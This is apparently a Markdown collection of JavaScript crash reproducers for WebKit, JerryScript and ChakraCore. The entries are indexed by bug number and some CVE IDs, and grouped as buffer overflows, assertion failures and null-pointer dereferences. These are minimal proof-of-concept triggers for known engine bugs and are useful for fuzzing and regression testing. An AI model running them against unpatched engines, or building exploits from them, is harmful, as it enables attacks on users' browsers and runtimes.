# Webkit

>  [相关漏洞查询网址](https://bugs.webkit.org/)

## buffer overflow

```javascript
// Bug 188694
function foo(oo) {
    oo.x = 4;
    oo.y = 4;
    oo.e = oo;
    i=9;
    oo.e = 7;
    oo.f = 8;
}
function Foo() {
    foo(this);
}
noInline(foo);
for (var i = 0;i<100000;i++) {
    g();
}
function g(){
    foo({f:8});
    new Foo();
    new Foo();
    new Foo();
}
```

## Assertion Failure

```javascript
// Bug 188917
function foo(o){}

function test() {
    	var floatArray = foo(new Float64Array(0));
}

for (var i = 0; i < 100000; ++i){
    test();
}
test();
```

```javascript
// Bug 173305 
createBuiltin(`function (a) {})`);
```
## Null Pointer Deref

```javascript
// Bug 172957
class A { };
class B extends A {
    constructor(a, b) {
        var f = () => b ? this : {};
        if (a) {
            var val = f() == super();
        } else {
            super();
            var val = f();
        }
    }
};
for (var i=0; i < 10000; i++) {
    try {
        new B(true, true);
    } catch (e) {
    }
    var a = new B(false, true);
    var c = new B(true, false);
}
```

# Jerryscript

> [漏洞查询相关网站](https://github.com/jerryscript-project/jerryscript/issues)
## buffer overflow
```javascript
// Bug 2238
fn_expr = function NaN(a){
'use strict';
NaN(0);
}
fn_expr(1);
```

```javascript
// CVE-2018-11418
// Bug 2237
(new RegExp("[\u0020")).exec("u");
```

```javascript
// CVE-2017-18212
// Bug 2140
RegExp("[\x0");
```

```javascript
// CVE-2018-11419
// Bug 2230
((new RegExp("[\u0")).exec("u"));
```

# ChakraCore

> [l漏洞查询相关网站](https://github.com/microsoft/ChakraCore/issues)
## Null Pointer Deref

```javascript
// Bug 5532
function g()
{
    for (var i=0;;++i)
    {
        for (var j=0;;++j){
             var a =0;
        }
    }
} 

g();

```



